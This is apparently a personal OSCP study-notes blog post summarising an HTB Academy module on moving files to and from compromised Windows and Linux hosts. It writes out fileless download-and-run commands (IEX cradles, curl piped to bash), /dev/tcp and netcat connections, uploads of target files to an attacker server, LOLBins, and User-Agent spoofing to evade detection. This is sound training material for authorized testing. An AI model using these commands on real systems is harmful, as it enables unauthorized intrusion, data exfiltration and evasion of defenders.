---
layout: single
title:  "HTB Academy - File Transfers"
categories: 
  - OSCP Notes
tags:
  - htb-academy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
permalink: /posts/file-transfers-notes
author_profile: false
sidebar:
  nav: "navbar"
---

## Windows File Transfer

### Download files

If the file to transfer is not too large, we can simply `base64` encode the file contents, copy and paste the encoded string in the target and decode it into a file.

* File integrity can be verified using `md5` hash.
* To decode a file in PowerShell:
  `[IO.File]::WriteAllBytes("<filepath>",[Convert]::FromBase64String("<b64-encoded string>"))`

Alternatively, we can download files through HTTP/HTTPS/FTP, using `System.Net.WebClient`.

* Normal download - `(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`
* Asynchronous download - `(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')`

To run PowerShell scripts in-memory (fileless attack), use the `Invoke-Expression` cmdlet (or `IEX`).

* `IEX (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')`

For web downloads, `wget` and `curl` are available as well.

* Note that `wget` may not be recognised. In this case, from PowerShell, use `Invoke-WebRequest -Uri <http url> -OutFile <outfile path>`

If certificates are not trusted, run `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`

If SMB is enabled, we can host an SMB server locally on our attack host, and download files from the target using the `copy` command in `cmd`.

* To host a server with the `CompData` share name: `sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/kali/Downloads/smb`
* Likewise for FTP and HTTP.

### Upload files

Similarly, `base64` encoding can be used. To encode a file in PowerShell: `[Convert]::ToBase64String((Get-Content -path "<filepath>" -Encoding byte))`

For web uploads, we can host a Python web server that allows uploads (using the `uploadserver` module). Once the server is alive, run the following PowerShell script:

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://<host ip>:<port>/upload -File <filepath>
```

Alternatively, create a `netcat` listener on our host, and `POST` the file encoded in `base64`: `Invoke-WebRequest -Uri http://<host ip>:<port>/ -Method POST -Body $b64`

If outbound SMB traffic is blocked, we can technically still run SMB over HTTP using `WebDav`. For this, we need to create a `WebDav` server on our host, then upload files from our target to the `WebDav` server using SMB.

Lastly, we can also upload to an FTP server using PowerShell:
`(New-Object Net.WebClient).UploadFile('ftp://<host ip>/ftp-hosts', '<filepath>')`

## Linux File Transfer

### Download files

Similarly, we can employ the `base64` encoding method, as well as using `cURL` and `wget` for web downloads.

If we wish to execute a fileless attack, we can pipe a downloaded script to our shell binary (similar to how we use `IEX` for PowerShell).

* `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
* Similar methods can be used to run scripts for other languages (e.g., piping a `Python` script to the `Python` interpreter).

If `wget` or `curl` are unavailable, we can use the `/dev/tcp` device:

* Connect to host - `exec 3<>/dev/tcp/<host ip>/<port>`
* Send a `GET` request - `echo -e "GET <file> HTTP/1.1\n\n">&3`
* Print response - `cat <&3`

If SSH is enabled on the target, we can use `scp` to copy files.

### Upload files

As mentioned earlier, we can also start an upload server on our host, and `POST` data from the target:
`curl -X POST https://<host ip>/upload -F 'files=@/<filepath>' --insecure`

* Note the usage of `--insecure` option, as we are running a self-signed certificate on our upload server.

Alternatively, we can host a web server on the target instead, and download files from our target to our attack host. A web server can be hosted using various languages (like Python, Ruby or PHP). This is only possible if the target comes installed with an aforementioned language.

Lastly, `scp` can also be used for file uploads.

## Misc File Transfer Methods

### Netcat

* Create a `nc` listener on the target, and redirect output to a filename: `nc -lvp 8888 > <filename>`
* Then, from our host, connect to the target and redirect input to `nc`: `nc -q 0 <target ip> 8888 < <filename>`
* Note that this process goes both ways - we can listen on the host, and connect from the target.

If the target does not have `netcat` or `ncat`, we can use the `/dev/tcp` device. For example, to connect to our host: `cat < /dev/tcp/<host ip>/<port> > <filename>`

### WinRM

If port 5985 is open, and we have adequate permissions, we can use `WinRM` as well.

* Use the `Copy-Item` cmdlet to transfer files bidirectionally (similar to `scp`).

### RDP

We can mount a directory from our attack host to the target using `RDP`.

* If we are connecting from Linux, we can use `xfreerdp` or `rdesktop`.
* If we are connecting from Windows, we can use `mstsc.exe`.

## Encryption

**Windows**: Use the `Invoke-AESEncryption.ps1` script to encrypt files for transfer.
**Linux**: Use `openssl enc -aes256` to encrypt files for transfer.

For more secure web transfers over HTTP, we can set up an `Apache` or `Nginx` server instead of using the Python webserver.

## Living off the Land Binaries (LOLBins)

LOLBins are OS-native/preinstalled binaries which allow attackers to perform file transfers, as well as command execution and file access (past their intended purpose).

* For example, `openssl` on Linux allows us to host servers and send files "`netcat`-style". This is beyond the intended scope of the binary, which is to generate certificates and do encryption/decryption.
* Other binaries: `bitsadmin` and `certutil` on Windows.

Binary collections:

* **Windows**: LOLBAS
* **Linux**: GTFOBins

## File Transfer Detection

For HTTP, the `User-Agent` header string can allow us to detect the source of HTTP requests.

* This includes details like the function call used, binary/utility used etc.

To bypass this, we can modify our User Agent when making requests over HTTP. This can be changed to something legitimate, like Mozilla Firefox.

Alternatively, use LOLBins instead of transfer methods like `netcat`.
